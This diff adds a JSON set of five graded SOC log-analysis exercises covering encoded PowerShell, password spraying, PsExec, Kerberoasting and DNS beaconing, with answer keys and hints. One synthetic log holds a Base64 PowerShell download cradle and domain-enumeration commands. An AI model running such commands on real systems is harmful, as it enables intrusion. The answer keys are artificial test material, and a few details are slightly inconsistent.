@@ -1,0 +1,88 @@
+[
+  {
+    "type": "log_analysis",
+    "topic": "Encoded PowerShell execution detection via Sysmon Event ID 1",
+    "points": 5,
+    "content": {
+      "question": "Examine the following Sysmon Event ID 1 records captured on WORKSTATION-17. Identify (a) the technique being executed, (b) the MITRE ATT&CK technique ID, and (c) two host-based detection improvements the SOC should implement.",
+      "log_format": "windows_event",
+      "log_excerpt": "UtcTime=2026-05-09 14:22:10 | EventID=1 | Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | CommandLine=powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAvAGQA | ParentImage=C:\\Windows\\System32\\cmd.exe | User=CORP\\jsmith | IntegrityLevel=High\nUtcTime=2026-05-09 14:22:11 | EventID=1 | Image=C:\\Windows\\System32\\net.exe | CommandLine=net user administrator /domain | ParentImage=powershell.exe | User=CORP\\jsmith | IntegrityLevel=High\nUtcTime=2026-05-09 14:22:14 | EventID=1 | Image=C:\\Windows\\System32\\net.exe | CommandLine=net group \"Domain Admins\" /domain | ParentImage=powershell.exe | User=CORP\\jsmith | IntegrityLevel=High\nUtcTime=2026-05-09 14:22:19 | EventID=1 | Image=C:\\Windows\\System32\\net.exe | CommandLine=net localgroup administrators | ParentImage=powershell.exe | User=CORP\\jsmith | IntegrityLevel=High",
+      "expected_findings": [
+        "T1059.001 — Command and Scripting Interpreter: PowerShell (encoded command obfuscation via -EncodedCommand)",
+        "T1087.002 — Account Discovery: Domain Account (net user / net group enumeration of domain administrators)",
+        "Elevated IntegrityLevel=High on all child processes indicates the PowerShell session has high-privilege token — suspicious for a standard user account (jsmith)"
+      ],
+      "sample_solution": "1. The -EncodedCommand flag indicates Base64-encoded PowerShell obfuscation (T1059.001). Decoding the payload reveals an Invoke-WebRequest download cradle to 192.168.1.1/da. 2. The powershell.exe process spawns multiple net.exe children performing domain enumeration — T1087.002 (Account Discovery). 3. High IntegrityLevel for a non-admin user (jsmith) suggests a prior privilege escalation. Detection improvements: (a) Enable PowerShell Script Block Logging (Event 4104) to capture the decoded script content. (b) Alert on Sysmon ID 1 where ParentImage contains cmd.exe and CommandLine contains -enc or -EncodedCommand. Baseline legitimate powershell.exe invocations for this user population.",
+      "hint": "Decode the Base64 string in -EncodedCommand — the decoded Unicode content will reveal the next-stage payload retrieval method."
+    },
+    "knowledge_base_source_ids": ["src_l2_001", "src_l2_002"]
+  },
+  {
+    "type": "log_analysis",
+    "topic": "Password spray pattern identification in Windows Event 4625",
+    "points": 5,
+    "content": {
+      "question": "The following Windows Security Event 4625 records were collected from a domain controller over a 4-minute window. Identify (a) the attack pattern, (b) the key field values that confirm it, and (c) the immediate triage step.",
+      "log_format": "windows_event",
+      "log_excerpt": "Time=09:14:03 | EventID=4625 | TargetUserName=ahughes | IpAddress=185.220.101.47 | LogonType=3 | SubStatus=0xC000006A\nTime=09:14:05 | EventID=4625 | TargetUserName=bpatel | IpAddress=185.220.101.47 | LogonType=3 | SubStatus=0xC000006A\nTime=09:14:07 | EventID=4625 | TargetUserName=csmith | IpAddress=185.220.101.47 | LogonType=3 | SubStatus=0xC000006A\nTime=09:14:09 | EventID=4625 | TargetUserName=djones | IpAddress=185.220.101.47 | LogonType=3 | SubStatus=0xC000006A\nTime=09:14:11 | EventID=4625 | TargetUserName=echen | IpAddress=185.220.101.47 | LogonType=3 | SubStatus=0xC000006A\nTime=09:14:13 | EventID=4625 | TargetUserName=flopez | IpAddress=185.220.101.47 | LogonType=3 | SubStatus=0xC000006A",
+      "expected_findings": [
+        "Password spraying — single source IP targeting multiple distinct accounts with the same wrong password (SubStatus=0xC000006A) at regular 2-second intervals",
+        "LogonType=3 (network logon) confirms remote authentication attempt, not interactive — consistent with external brute force against the domain controller"
+      ],
+      "sample_solution": "1. All 4625 events share IpAddress=185.220.101.47 and SubStatus=0xC000006A (wrong password), but each targets a different TargetUserName — the defining signature of password spraying. 2. The regular 2-second cadence indicates automated tooling. 3. LogonType=3 (network logon) confirms this is a remote attempt, not an interactive one. Immediate triage: (a) Block or geo-fence 185.220.101.47 at the perimeter; (b) check if any account was successfully authenticated (Event 4624) from this IP; (c) query the full 24-hour 4625 window from this IP to scope the full account list targeted.",
+      "hint": "Look for the pattern: single IpAddress, multiple distinct TargetUserName values, all with the same SubStatus code and a consistent time cadence."
+    },
+    "knowledge_base_source_ids": ["src_l2_003"]
+  },
+  {
+    "type": "log_analysis",
+    "topic": "PsExec lateral movement identification via Sysmon",
+    "points": 5,
+    "content": {
+      "question": "The following Sysmon and Windows Security events were collected on SERVER-DB01 over a 60-second window. Identify (a) the lateral movement technique, (b) the MITRE technique ID, and (c) whether the activity suggests credential theft or explicit credential use.",
+      "log_format": "windows_event",
+      "log_excerpt": "09:47:12 | Security | EventID=4624 | TargetUserName=svc_backup | LogonType=3 | AuthenticationPackageName=NTLM | IpAddress=10.10.5.22 | WorkstationName=WS-HR-07\n09:47:13 | Sysmon | EventID=1 | Image=C:\\Windows\\services.exe | CommandLine=C:\\Windows\\services.exe | ParentImage=wininit.exe\n09:47:14 | Sysmon | EventID=1 | Image=C:\\Windows\\PSEXESVC.EXE | CommandLine=C:\\Windows\\PSEXESVC.EXE | ParentImage=C:\\Windows\\services.exe | User=NT AUTHORITY\\SYSTEM\n09:47:15 | Sysmon | EventID=1 | Image=C:\\Windows\\System32\\cmd.exe | CommandLine=cmd.exe | ParentImage=C:\\Windows\\PSEXESVC.EXE | User=NT AUTHORITY\\SYSTEM\n09:47:22 | Sysmon | EventID=1 | Image=C:\\Windows\\System32\\whoami.exe | CommandLine=whoami /all | ParentImage=C:\\Windows\\System32\\cmd.exe | User=NT AUTHORITY\\SYSTEM",
+      "expected_findings": [
+        "T1021.002 — Remote Services: SMB/Windows Admin Shares (PsExec lateral movement — PSEXESVC.EXE spawned by services.exe)",
+        "NTLM LogonType=3 from WS-HR-07 using svc_backup credentials — a service account authenticating from an HR workstation is anomalous and suggests credential theft or Pass-the-Hash (T1550.002)"
+      ],
+      "sample_solution": "1. The process chain services.exe → PSEXESVC.EXE → cmd.exe → whoami is the canonical PsExec execution artifact (T1021.002). PSEXESVC.EXE is the PsExec service binary that PsExec installs on the target host. 2. The preceding Event 4624 shows NTLM network logon (LogonType=3) from WS-HR-07 using svc_backup — a service account should not authenticate interactively from an HR workstation, suggesting credential theft (T1003) or Pass-the-Hash (T1550.002). 3. Triage: check WS-HR-07 for svc_backup credential exposure; pull all Sysmon ID 1 events from WS-HR-07 in the prior 30 minutes for the initial compromise path.",
+      "hint": "The key artifact is services.exe spawning a binary named PSEXESVC.EXE — this is not normal Windows service behavior."
+    },
+    "knowledge_base_source_ids": ["src_l2_006"]
+  },
+  {
+    "type": "log_analysis",
+    "topic": "Kerberoasting pattern detection in Windows Event 4769",
+    "points": 5,
+    "content": {
+      "question": "Review the following Windows Security Event 4769 records collected from the domain controller. Identify (a) the attack being conducted, (b) the specific field value that confirms it, and (c) the MITRE ATT&CK technique ID.",
+      "log_format": "windows_event",
+      "log_excerpt": "10:32:01 | EventID=4769 | AccountName=jsmith@CORP.LOCAL | ServiceName=svc_mssql | TicketEncryptionType=0x17 | IpAddress=10.10.5.55\n10:32:02 | EventID=4769 | AccountName=jsmith@CORP.LOCAL | ServiceName=svc_backup | TicketEncryptionType=0x17 | IpAddress=10.10.5.55\n10:32:03 | EventID=4769 | AccountName=jsmith@CORP.LOCAL | ServiceName=svc_exchange | TicketEncryptionType=0x17 | IpAddress=10.10.5.55\n10:32:04 | EventID=4769 | AccountName=jsmith@CORP.LOCAL | ServiceName=svc_sharepoint | TicketEncryptionType=0x17 | IpAddress=10.10.5.55\n10:32:05 | EventID=4769 | AccountName=jsmith@CORP.LOCAL | ServiceName=http_proxy | TicketEncryptionType=0x17 | IpAddress=10.10.5.55",
+      "expected_findings": [
+        "T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting — single account requesting TGS for multiple service accounts using RC4 (TicketEncryptionType=0x17) within 5 seconds",
+        "TicketEncryptionType=0x17 (RC4-HMAC) is the Kerberoasting indicator — an attacker deliberately requests RC4 tickets (instead of AES256/0x12) to enable offline cracking of service account passwords"
+      ],
+      "sample_solution": "1. Five Event 4769 records in 5 seconds from jsmith@CORP.LOCAL, all requesting RC4-encrypted service tickets (TicketEncryptionType=0x17) for different service accounts, constitutes Kerberoasting (T1558.003). The attack requests TGS tickets that are encrypted with the service account's password hash, enabling offline dictionary attacks. 2. The key indicator is TicketEncryptionType=0x17 — modern environments default to AES256 (0x12). RC4 requests from a regular user account are anomalous. 3. Response: identify all service accounts targeted and reset their passwords to long random strings; audit SPNs for service accounts that have unnecessary user-account associations.",
+      "hint": "The TicketEncryptionType value is the smoking gun — 0x17 (RC4) is weak and exploitable; 0x12 (AES256) is the expected value in a hardened environment."
+    },
+    "knowledge_base_source_ids": ["src_l2_009"]
+  },
+  {
+    "type": "log_analysis",
+    "topic": "C2 beacon jitter pattern in DNS query logs",
+    "points": 5,
+    "content": {
+      "question": "The following DNS query log entries were extracted for host WORKSTATION-03 (10.10.1.45) over a 20-minute window. Identify (a) the suspicious pattern, (b) why it suggests C2 beaconing rather than normal application DNS, and (c) the next investigative step.",
+      "log_format": "json",
+      "log_excerpt": "{\"ts\":\"14:00:02\",\"src\":\"10.10.1.45\",\"query\":\"telemetry.analytics-cdn.net\",\"type\":\"A\",\"answer\":\"34.102.45.1\"}\n{\"ts\":\"14:05:14\",\"src\":\"10.10.1.45\",\"query\":\"telemetry.analytics-cdn.net\",\"type\":\"A\",\"answer\":\"34.102.45.7\"}\n{\"ts\":\"14:10:27\",\"src\":\"10.10.1.45\",\"query\":\"telemetry.analytics-cdn.net\",\"type\":\"A\",\"answer\":\"34.102.45.3\"}\n{\"ts\":\"14:15:41\",\"src\":\"10.10.1.45\",\"query\":\"telemetry.analytics-cdn.net\",\"type\":\"A\",\"answer\":\"34.102.45.9\"}\n{\"ts\":\"14:20:55\",\"src\":\"10.10.1.45\",\"query\":\"telemetry.analytics-cdn.net\",\"type\":\"A\",\"answer\":\"34.102.45.2\"}",
+      "expected_findings": [
+        "Periodic beacon jitter pattern: DNS queries at approximately 5-minute intervals (312s, 313s, 314s, 314s — consistent with jitter ±30s around a 5-minute beacon interval) indicate automated C2 check-in",
+        "Fast-flux DNS response: the query resolves to a different IP on each check-in (34.102.45.1, .7, .3, .9, .2) despite the same FQDN — indicating C2 infrastructure IP rotation to evade IP-based blocklists"
+      ],
+      "sample_solution": "1. The 5 DNS queries occur at intervals of 312s, 313s, 314s, 314s — near-identical spacing with slight jitter, characteristic of beacon software adding randomness to evade timing-based detection. 2. Each query returns a different IP answer (fast-flux) — legitimate CDN telemetry endpoints use stable IPs or well-known CDN ranges. 3. The domain telemetry.analytics-cdn.net is designed to appear legitimate but does not match known analytics vendor domains. Next steps: (a) query all internal hosts for DNS queries to this domain to scope compromise breadth; (b) pull Sysmon ID 3 (NetworkConnect) for WORKSTATION-03 to identify which process is making these connections; (c) check TLS metadata for JA3 fingerprinting.",
+      "hint": "Calculate the intervals between timestamps — consistent spacing with minor variance is the beacon jitter signature. Also compare the DNS answers across queries."
+    },
+    "knowledge_base_source_ids": ["src_l2_008"]
+  }
+]
